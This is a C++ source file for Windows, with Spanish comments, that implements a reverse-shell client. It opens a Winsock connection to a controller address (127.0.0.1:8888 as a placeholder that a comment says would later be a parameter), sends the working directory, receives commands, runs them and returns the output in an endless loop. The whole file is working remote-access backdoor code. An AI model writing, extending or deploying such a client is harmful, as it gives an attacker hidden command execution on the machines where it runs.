#include<stdio.h>
#include<winsock2.h>
#include<string>
#include<iostream>
#include "exec.h"
#include <windows.h>

#pragma comment(lib,"ws2_32.lib") 
 
int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    std::string messages;
    char recvbuf[4096];
    int recvbuflen = 4096;
    std::string res;
    std::string recvbuf1;
 
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
    
    printf("Initialised.\n");
    

    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
    
    
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Dirección de prueba, esta la recibiría como parámetro
    server.sin_family = AF_INET;
    server.sin_port = htons( 8888 );

    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    } 
    puts("Connected");
    while (true)
    {
        std::string dir = obtain_directory();
        if (send(s,dir.c_str(),dir.size(),0) == SOCKET_ERROR) {
            printf("Error en send: %d\n", WSAGetLastError());
            break;
        }
        ssize_t result = recv(s, recvbuf, recvbuflen, 0);
		if (result > 0) {
			recvbuf[result] = '\0'; // Asegura que sea una cadena válida
			res = executeCommand(recvbuf);
            if (send(s,res.data(),res.size(),0) == SOCKET_ERROR) {
                printf("Error en send: %d\n", WSAGetLastError());
                break;
            }
		} else {
			puts("Connection Error");
		}

    }
    
    
    
 
    return 0;
}